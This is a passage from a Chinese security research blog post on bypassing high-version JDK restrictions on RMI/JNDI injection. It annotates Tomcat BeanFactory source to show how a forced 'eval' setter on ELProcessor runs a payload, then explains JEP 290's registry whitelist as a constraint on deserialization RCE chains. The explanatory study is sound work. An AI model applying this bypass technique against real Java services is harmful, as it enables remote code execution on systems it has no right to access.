+                    <span class="token comment" spellcheck="true">/* Items are given as comma separated list */</span>
+                  <span class="token comment" spellcheck="true">//将“x=eval”这段字符串进行分割</span>
+                    <span class="token keyword">for</span> <span class="token punctuation">(</span>String param<span class="token operator">:</span> value<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        param <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token comment" spellcheck="true">/* A single item can either be of the form name=method
+                         * or just a property name (and we will use a standard
+                         * setter) */</span>
+                          <span class="token comment" spellcheck="true">//获取 = 号前面的部分，也就是“x”</span>
+                        index <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                          <span class="token comment" spellcheck="true">//获取 = 号后面的内容 也就是“eval”</span>
+                            setterName <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            param <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                            setterName <span class="token operator">=</span> <span class="token string">"set"</span> <span class="token operator">+</span>
+                                         param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span>Locale<span class="token punctuation">.</span>ENGLISH<span class="token punctuation">)</span> <span class="token operator">+</span>
+                                         param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+                        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                          <span class="token comment" spellcheck="true">//将“x”作为key 通过反射的形式</span>
+                          <span class="token comment" spellcheck="true">//ElProcessor.class.getMethod("eval",new Class[1])</span>
+                          <span class="token comment" spellcheck="true">//获取eval方法对象并作为value一同存入forced这个HashMap中</span>
+                            forced<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span>
+                                       beanClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>setterName<span class="token punctuation">,</span> paramTypes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchMethodException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span>
+                                <span class="token punctuation">(</span><span class="token string">"Forced String setter "</span> <span class="token operator">+</span> setterName <span class="token operator">+</span>
+                                 <span class="token string">" not found for property "</span> <span class="token operator">+</span> param<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span>
+                                <span class="token punctuation">(</span><span class="token string">"Forced String setter "</span> <span class="token operator">+</span> setterName <span class="token operator">+</span>
+                                 <span class="token string">" not allowed for property "</span> <span class="token operator">+</span> param<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+
+                Enumeration<span class="token operator">&lt;</span>RefAddr<span class="token operator">></span> e <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                <span class="token keyword">while</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+                    ra <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    String propName <span class="token operator">=</span> ra<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token comment" spellcheck="true">//循环找到“x”所对应的addr </span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>Constants<span class="token punctuation">.</span>FACTORY<span class="token punctuation">)</span> <span class="token operator">||</span>
+                        propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"scope"</span><span class="token punctuation">)</span> <span class="token operator">||</span> propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"auth"</span><span class="token punctuation">)</span> <span class="token operator">||</span>
+                        propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">)</span> <span class="token operator">||</span>
+                        propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"singleton"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">continue</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                    <span class="token comment" spellcheck="true">//获取其中的contents 也就是payload</span>
+                    value <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>ra<span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                    Object<span class="token punctuation">[</span><span class="token punctuation">]</span> valueArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+                    <span class="token comment" spellcheck="true">/* Shortcut for properties with explicitly configured setter */</span>
+                  <span class="token comment" spellcheck="true">//从forced这个hashmap中取出key为x的一项</span>
+                    Method method <span class="token operator">=</span> forced<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>propName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>method <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
+                        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                          <span class="token comment" spellcheck="true">//通过反射的方式调用ElProcessor.eval方法并将payload作为参数传入</span>
+                            method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> valueArray<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>可以看到该部分的代码是将我们在<code>Reference</code>中指定的<code>className</code>通过反射的形式给实例化出来了，并解析传递来的<code>Reference</code>对象，最终通过反射的形式调用了ElProcessor.eval方法将payload作为参数传入然后执行。</p>
+<p>这就是通过加载本地ObjectFactory的方式进行RMI Reference攻击，以上案例中使用到了以下几个类</p>
+<p><code>org.apache.naming.factory.BeanFactory</code>   该类依赖于tomcat-catalina.jar</p>
+<p><code>javax.el.ELProcessor</code>   和该类依赖于tomcat-embed-el.jar  尝试过使用javax.el-api.jar 和el-ri.jar但是会报各种错误</p>
+<p>也就是说只有在目标目标服务器上存在上述jar包时，案例中的方法才能够利用成功，所以该方法非常局限。</p>
+<h2 id="绕过姿势2"><a href="#绕过姿势2" class="headerlink" title="绕过姿势2"></a>绕过姿势2</h2><p>众所周知，在Oracle 在JDK 高版本中添加了一项针对java反序列化漏洞的机制 JEP 290，影响范围由以下三个版本及其及后的所有版本，</p>
+<ul>
+<li>Java™ SE Development Kit 8, Update 121 (JDK 8u121)</li>
+<li>Java™ SE Development Kit 7, Update 131 (JDK 7u131)</li>
+<li>Java™ SE Development Kit 6, Update 141 (JDK 6u141)</li>
+</ul>
+<p>这里简单介绍下JEP 290</p>
+<p>JEP 290主要提供了以下几种机制</p>
+<p>1 提供一个限制反序列化类的机制，白名单或者黑名单 </p>
+<p>2 限制反序列化的深度和复杂度 </p>
+<p>3 为RMI远程调用对象提供了一个验证类的机制 </p>
+<p>4 定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器 </p>
+<p>通俗点说就是我们可以通过自定义白名单或者黑名单的方式来对传递过来的反序列化数据进行校验，同时可以自定义一次反序列化行为的次数和深度</p>
+<p>在JDK 8u121 版本之前 我们可以通过 ysoserial中的<code>RMIRegistryExploit</code>搭配指定的gadget来攻击 <code>Registry</code>该攻击方式本质上就是利用了RMI server在调用 bind方法向<code>Registry</code>注册远程对象方法时传递的是一个Proxy对象，该对象为Proxy搭配上RemoteObjectInvocationHandler，反序列化时只会判断是否是Proxy对象并不会判断该Proxy对象里面用的是什么InvocationHandler，所以我们可以使用经典的搭配Proxy加上AnnotationInvocationHandler再配上指定的gadget就可以轻松RCE。</p>
+<p>但是在JDK 8u121版本之后添加了JEP 290 本质上就是提供了一个<code>ObjectInputFilter</code>该接口是一个函数式接口只有一个抽象方法<code>checkInput</code>方法</p>
+<p>![1](高版本 JDK RMI JNDI Bypass 学习笔记/1.png)</p>
+<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//该方法在调用时需要传递一个实现了FilterInfo接口的对象进去</span>
+ObjectInputFilter<span class="token punctuation">.</span>Status <span class="token function">checkInput</span><span class="token punctuation">(</span>ObjectInputFilter<span class="token punctuation">.</span>FilterInfo var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">//下面是FilterInfo接口的相关细节</span>
+    <span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">FilterInfo</span> <span class="token punctuation">{</span>
+        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">serialClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">long</span> <span class="token function">arrayLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">long</span> <span class="token function">depth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">long</span> <span class="token function">references</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">long</span> <span class="token function">streamBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span></code></pre>
+<p>同时在JDK 8u121版本之后的RMI服务中  <code>Registry</code>在实例化的过程中就 就自定义了一份校验规则在反序列化服务端传递来的Proxy对象时进行校验。</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> Status <span class="token function">registryFilter</span><span class="token punctuation">(</span>FilterInfo var0<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>registryFilter <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        Status var1 <span class="token operator">=</span> registryFilter<span class="token punctuation">.</span><span class="token function">checkInput</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">!=</span> Status<span class="token punctuation">.</span>UNDECIDED<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> var1<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true">//判断反序列化深度 不能超过20</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>var0<span class="token punctuation">.</span><span class="token function">depth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> 20L<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> Status<span class="token punctuation">.</span>REJECTED<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        Class <span class="token class-name">var2</span> <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">serialClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>var2 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var2<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+              <span class="token comment" spellcheck="true">//白名单校验，只有下列类允许被反序列化，不在白名单内的类在反序列化时会抛出异常。</span>
+                <span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">!=</span> var2 <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Remote<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Proxy<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>UnicastRef<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>RMIClientSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>RMIServerSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>ActivationID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>UID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">?</span> Status<span class="token punctuation">.</span>REJECTED <span class="token operator">:</span> Status<span class="token punctuation">.</span>ALLOWED<span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> var0<span class="token punctuation">.</span><span class="token function">arrayLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> 0L <span class="token operator">&amp;&amp;</span> var0<span class="token punctuation">.</span><span class="token function">arrayLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> 1000000L <span class="token operator">?</span> Status<span class="token punctuation">.</span>REJECTED <span class="token operator">:</span> Status<span class="token punctuation">.</span>UNDECIDED<span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> Status<span class="token punctuation">.</span>UNDECIDED<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>所以Proxy加上AnnotationInvocationHandler的形式就不再适用了，</p>
+<p>![2](高版本 JDK RMI JNDI Bypass 学习笔记/2.png)</p>
+<p>如果想要在高版本 JDK的限制下 成功反序列化Rce 那么利用连就只能从白名单里的这些类中找</p>
+<p>未完待续</p>
+<p>参考链接</p>
+<p><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p>
+<p><a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/" target="_blank" rel="noopener">http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/</a></p>
+<p><a href="https://www.anquanke.com/post/id/211722" target="_blank" rel="noopener">https://www.anquanke.com/post/id/211722</a></p>
+<p><a href="http://openjdk.java.net/jeps/290" target="_blank" rel="noopener">http://openjdk.java.net/jeps/290</a></p>
+<p><a href="https://blog.csdn.net/u011721501/article/details/78555246" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/78555246</a></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <i class="fas fa-exclamation-circle"></i>
+            在法律允许的范围内，
+            <a href="http://LinShiG0ng.github.io">
+                有关部门临时工
+            </a>
+            在天融信阿尔法实验室工作期间创作
+            <a  href="/2020/09/23/gao-ban-ben-jdk-rmi-jndi-bypass-xue-xi-bi-ji/">
+                《高版本 JDK RMI JNDI Bypass 学习笔记》
+            </a>
+            。此作品发布在：
+            <span property="vcard:Country" datatype="dct:ISO3166"
+                content="CN" about="/2020/09/23/gao-ban-ben-jdk-rmi-jndi-bypass-xue-xi-bi-ji/">
+                天融信阿尔法实验室官方公众号及其各大论坛官方账号
+            </span>
+            </p>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+                                    <span class="chip bg-color">漏洞利用</span>
+                                </a>
+                            
+                                <a href="/tags/RMI/">
+                                    <span class="chip bg-color">RMI</span>
+                                </a>
+                            
+                                <a href="/tags/JNDI/">
+                                    <span class="chip bg-color">JNDI</span>
+                                </a>
+                            
+                                <a href="/tags/RPC/">
+                                    <span class="chip bg-color">RPC</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/09/23/ge-ren-xue-xi-guo-cheng-zhong-dui-rmi-jrmp-yi-ji-jndi-de-yi-xie-li-jie/">
+                    <div class="card-image">
+                        
+                        <img src="http://pic.netbian.com/uploads/allimg/170517/202955-1495024195d64d.jpg" class="responsive-img" alt="个人学习过程中对RMI JRMP 以及JNDI的一些理解">
+                        
+                        <span class="card-title">个人学习过程中对RMI JRMP 以及JNDI的一些理解</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            在RMI 和 JNDI注入姿势学习过程中的一些笔记
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-09-23
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            有关部门临时工
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+                        <span class="chip bg-color">漏洞利用</span>
+                    </a>
+                    
+                    <a href="/tags/RMI/">
+                        <span class="chip bg-color">RMI</span>
+                    </a>
+                    
+                    <a href="/tags/JNDI/">
+                        <span class="chip bg-color">JNDI</span>
+                    </a>
+                    
+                    <a href="/tags/RPC/">
+                        <span class="chip bg-color">RPC</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/">
+                    <div class="card-image">
+                        
+                        <img src="http://pic.netbian.com/uploads/allimg/191106/000301-15729697816379.jpg" class="responsive-img" alt="Apache dubbo (CVE-2020-1948) 反序列化远程代码执行漏洞及其补丁绕过深度分析">
+                        
+                        <span class="card-title">Apache dubbo (CVE-2020-1948) 反序列化远程代码执行漏洞及其补丁绕过深度分析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Dubbo是一个分布式服务框架，致力于提供高性能和透明化的RPC远程服务调用方案，以及SOA服务治理方案。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-03
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            有关部门临时工
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CVE/">
+                        <span class="chip bg-color">CVE</span>
+                    </a>
+                    
+                    <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Web安全</span>
+                    </a>
+                    
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
+                    </a>
+                    
+                    <a href="/tags/Apache-Dubbo/">
+                        <span class="chip bg-color">Apache Dubbo</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
